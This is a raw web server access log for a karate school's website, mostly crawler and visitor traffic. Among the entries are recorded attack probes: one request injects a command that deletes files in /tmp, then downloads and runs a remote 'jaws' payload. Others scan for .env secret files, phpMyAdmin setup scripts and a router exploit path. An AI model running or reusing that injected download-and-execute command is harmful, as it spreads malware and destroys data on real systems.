::ffff:183.136.225.35 - - [26/Aug/2022:00:00:27 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
::ffff:51.222.253.15 - - [26/Aug/2022:08:09:57 +0000] "GET /images/instructors/rodnak.jpg HTTP/1.1" 200 12841 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.20 - - [26/Aug/2022:08:09:57 +0000] "GET /images/instructors/justin.jpg HTTP/1.1" 200 14091 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.7 - - [26/Aug/2022:08:09:58 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.12 - - [26/Aug/2022:08:09:59 +0000] "GET /images/schools/manzanitakaratedo.jpg HTTP/1.1" 200 1829058 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.11 - - [26/Aug/2022:08:10:00 +0000] "GET /images/instructors/SenseiLarry.jpg HTTP/1.1" 200 60380 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.20 - - [26/Aug/2022:08:10:01 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.14 - - [26/Aug/2022:08:10:02 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.3 - - [26/Aug/2022:08:10:02 +0000] "GET /images/instructors/dokeeffe.jpg HTTP/1.1" 200 42708 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.8 - - [26/Aug/2022:08:10:03 +0000] "GET /images/instructors/don.jpg HTTP/1.1" 200 76210 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:92.118.39.88 - - [26/Aug/2022:08:15:02 +0000] "GET / HTTP/1.1" 200 58158 "-" "-"
::ffff:207.46.13.143 - - [26/Aug/2022:08:16:29 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.55.39.117 - - [26/Aug/2022:08:17:38 +0000] "GET /docs/bushido-code.pdf HTTP/1.1" 404 160 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:154.209.125.66 - - [26/Aug/2022:08:18:20 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
::ffff:66.249.66.198 - - [26/Aug/2022:08:22:01 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.54 - - [26/Aug/2022:08:22:01 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.199 - - [26/Aug/2022:08:22:02 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.200 - - [26/Aug/2022:08:22:02 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.63 - - [26/Aug/2022:08:22:02 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.54 - - [26/Aug/2022:08:22:05 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:157.55.39.26 - - [26/Aug/2022:08:25:24 +0000] "GET /schoolsandschedules.html HTTP/1.1" 404 163 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:46.161.11.227 - - [26/Aug/2022:08:39:01 +0000] "GET / HTTP/1.0" 200 58158 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4087.0 Safari/537.36"
::ffff:46.161.11.227 - - [26/Aug/2022:08:39:05 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4087.0 Safari/537.36"
::ffff:46.161.11.227 - - [26/Aug/2022:08:39:06 +0000] "GET /?err=error HTTP/1.0" 200 58710 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4087.0 Safari/537.36"
::ffff:207.46.13.188 - - [26/Aug/2022:08:46:41 +0000] "GET /resources HTTP/1.1" 200 194906 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:51.222.253.19 - - [26/Aug/2022:08:52:04 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:157.55.39.86 - - [26/Aug/2022:08:56:40 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:185.254.196.115 - - [26/Aug/2022:09:13:56 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [26/Aug/2022:09:13:56 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:207.46.13.74 - - [26/Aug/2022:09:16:16 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.143 - - [26/Aug/2022:09:16:31 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.168 - - [26/Aug/2022:09:16:59 +0000] "GET /schools HTTP/1.1" 200 96626 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.113 - - [26/Aug/2022:09:17:13 +0000] "GET /events HTTP/1.1" 200 9364 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.168 - - [26/Aug/2022:09:17:28 +0000] "GET /joinemail?type=promotions HTTP/1.1" 200 8841 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.74 - - [26/Aug/2022:09:17:33 +0000] "GET /joinemail?type=blackbeltclasses HTTP/1.1" 200 8998 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:20.84.53.67 - - [26/Aug/2022:09:17:38 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.84.53.67 - - [26/Aug/2022:09:17:38 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:45.79.171.66 - - [26/Aug/2022:09:17:46 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:207.46.13.188 - - [26/Aug/2022:09:19:13 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:104.248.51.8 - - [26/Aug/2022:09:34:51 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
::ffff:207.46.13.113 - - [26/Aug/2022:09:37:15 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:51.222.253.2 - - [26/Aug/2022:09:37:27 +0000] "GET /contact?s=1&ss=10 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:162.221.192.26 - - [26/Aug/2022:09:43:57 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:109.237.103.118 - - [26/Aug/2022:09:47:21 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:207.46.13.113 - - [26/Aug/2022:09:50:16 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.74 - - [26/Aug/2022:10:08:19 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:46.161.11.238 - - [26/Aug/2022:10:09:03 +0000] "GET / HTTP/1.0" 200 58158 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.44 Safari/537.36"
::ffff:46.161.11.238 - - [26/Aug/2022:10:09:03 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.44 Safari/537.36"
::ffff:46.161.11.238 - - [26/Aug/2022:10:09:04 +0000] "GET /?err=error HTTP/1.0" 200 58710 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.44 Safari/537.36"
::ffff:207.46.13.173 - - [26/Aug/2022:10:15:42 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:54.36.148.96 - - [26/Aug/2022:10:18:33 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.11 - - [26/Aug/2022:10:18:35 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:37.225.78.41 - - [26/Aug/2022:10:19:21 +0000] "HEAD /katas.html HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
::ffff:66.249.70.126 - - [26/Aug/2022:10:34:26 +0000] "GET / HTTP/1.1" 304 - "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.34 - - [26/Aug/2022:10:34:28 +0000] "GET /books.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:46.249.32.178 - - [26/Aug/2022:10:38:14 +0000] "GET / HTTP/1.1" 200 58158 "-" "Linux Gnu (cow)"
::ffff:159.242.234.233 - - [26/Aug/2022:10:39:26 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.2382.108 Safari/537.36"
::ffff:159.242.234.233 - - [26/Aug/2022:10:39:26 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3007.104 Safari/537.36"
::ffff:159.242.234.233 - - [26/Aug/2022:10:39:27 +0000] "GET /BLOG/ HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.2382.108 Safari/537.36"
::ffff:159.242.234.233 - - [26/Aug/2022:10:39:27 +0000] "GET /BLOG/ HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3007.104 Safari/537.36"
::ffff:185.254.196.115 - - [26/Aug/2022:10:40:58 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [26/Aug/2022:10:40:59 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:143.92.32.136 - - [26/Aug/2022:10:41:15 +0000] "GET / HTTP/1.1" 200 58158 "-" "<title>(.*?)<\/title>"
::ffff:46.161.11.227 - - [26/Aug/2022:10:48:42 +0000] "GET / HTTP/1.0" 200 58158 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.0 Safari/537.36"
::ffff:46.161.11.227 - - [26/Aug/2022:10:48:43 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.0 Safari/537.36"
::ffff:46.161.11.227 - - [26/Aug/2022:10:48:44 +0000] "GET /?err=error HTTP/1.0" 200 58710 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.0 Safari/537.36"
::ffff:23.251.102.74 - - [26/Aug/2022:10:52:52 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:66.249.70.122 - - [26/Aug/2022:10:56:56 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.70.122 - - [26/Aug/2022:10:56:56 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:45.95.55.5 - - [26/Aug/2022:11:10:55 +0000] "GET / HTTP/1.1" 200 58158 "-" "-"
::ffff:51.222.253.9 - - [26/Aug/2022:11:22:05 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:192.241.235.167 - - [26/Aug/2022:11:38:24 +0000] "GET /portal/redlion HTTP/1.1" 404 153 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:207.46.13.113 - - [26/Aug/2022:11:40:28 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:46.146.154.57 - - [26/Aug/2022:11:47:43 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 158 "-" "Hello, World"
::ffff:207.46.13.113 - - [26/Aug/2022:11:54:58 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:43.134.171.185 - - [26/Aug/2022:12:00:15 +0000] "GET / HTTP/1.1" 200 58158 "-" "'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0'"
::ffff:192.241.214.193 - - [26/Aug/2022:12:03:53 +0000] "GET /hudson HTTP/1.1" 404 145 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:66.249.66.34 - - [26/Aug/2022:12:04:28 +0000] "GET /books.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:207.46.13.188 - - [26/Aug/2022:12:15:39 +0000] "GET /images/igpic.webp HTTP/1.1" 200 1328 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:46.161.11.238 - - [26/Aug/2022:12:16:46 +0000] "GET / HTTP/1.0" 200 58158 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.44 Safari/537.36 OPR/69.0.3686.7 (Edition beta)"
::ffff:46.161.11.238 - - [26/Aug/2022:12:16:47 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.44 Safari/537.36 OPR/69.0.3686.7 (Edition beta)"
::ffff:46.161.11.238 - - [26/Aug/2022:12:16:47 +0000] "GET /?err=error HTTP/1.0" 200 58710 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.44 Safari/537.36 OPR/69.0.3686.7 (Edition beta)"
::ffff:114.119.135.193 - - [26/Aug/2022:12:17:46 +0000] "GET / HTTP/1.1" 200 58158 "http://www.wadokikai.net/joinemail?type=blackbeltclasses" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:20.191.45.212 - - [26/Aug/2022:12:19:23 +0000] "GET / HTTP/1.1" 200 58158 "http://wadokikai.org/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:20.191.45.212 - - [26/Aug/2022:12:19:23 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/images/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:157.55.39.86 - - [26/Aug/2022:12:20:51 +0000] "GET /docs/MSACFall2021PrelimSchedule.pdf HTTP/1.1" 404 174 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:51.222.253.20 - - [26/Aug/2022:12:21:43 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.16 - - [26/Aug/2022:12:21:46 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.16 - - [26/Aug/2022:12:21:47 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:156.199.48.139 - - [26/Aug/2022:12:23:50 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+synns.cf/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:143.198.147.243 - - [26/Aug/2022:12:30:41 +0000] "GET /api/system/home HTTP/1.1" 404 154 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.2) Gecko/20040804 Netscape/7.2 (ax)"
::ffff:128.1.248.26 - - [26/Aug/2022:12:31:04 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:137.184.26.222 - - [26/Aug/2022:12:31:07 +0000] "GET /api/system/home HTTP/1.1" 404 154 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) GSA/61.0.217752169 Mobile/16A404 Safari/604.1"
::ffff:185.180.143.6 - - [26/Aug/2022:12:38:34 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:185.180.143.6 - - [26/Aug/2022:12:38:35 +0000] "GET /webfig/ HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:64.62.197.212 - - [26/Aug/2022:12:42:48 +0000] "GET / HTTP/1.1" 200 58158 "-" "-"
::ffff:2.57.122.98 - - [26/Aug/2022:12:47:36 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:64.62.197.212 - - [26/Aug/2022:12:49:27 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:109.237.103.123 - - [26/Aug/2022:12:52:02 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:67.160.201.88 - - [26/Aug/2022:12:55:28 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [26/Aug/2022:12:55:28 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [26/Aug/2022:12:55:31 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [26/Aug/2022:12:55:31 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:46.161.11.227 - - [26/Aug/2022:12:59:18 +0000] "GET / HTTP/1.0" 200 58158 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.14 Safari/537.36"
::ffff:46.161.11.227 - - [26/Aug/2022:12:59:19 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.14 Safari/537.36"
::ffff:46.161.11.227 - - [26/Aug/2022:12:59:19 +0000] "GET /?err=error HTTP/1.0" 200 58710 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.14 Safari/537.36"
::ffff:112.95.154.5 - - [26/Aug/2022:13:05:23 +0000] "GET http://34.212.47.6:80/pma/scripts/setup.php HTTP/1.0" 404 160 "-" "-"
::ffff:112.95.154.5 - - [26/Aug/2022:13:05:23 +0000] "GET http://34.212.47.6:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:112.95.154.5 - - [26/Aug/2022:13:05:23 +0000] "GET http://34.212.47.6:80/mysql/scripts/setup.php HTTP/1.0" 404 162 "-" "-"
::ffff:106.75.21.224 - - [26/Aug/2022:13:17:02 +0000] "GET / HTTP/1.0" 200 58158 "-" "-"
::ffff:8.219.136.124 - - [26/Aug/2022:13:29:10 +0000] "GET / HTTP/1.1" 200 58158 "-" "'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0'"
::ffff:128.14.234.151 - - [26/Aug/2022:13:31:20 +0000] "GET / HTTP/1.1" 200 58158 "-" "curl/7.29.0"
::ffff:75.161.18.103 - - [26/Aug/2022:13:33:30 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (Linux; Android 12; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:75.161.18.103 - - [26/Aug/2022:13:33:30 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:75.161.18.103 - - [26/Aug/2022:13:33:31 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
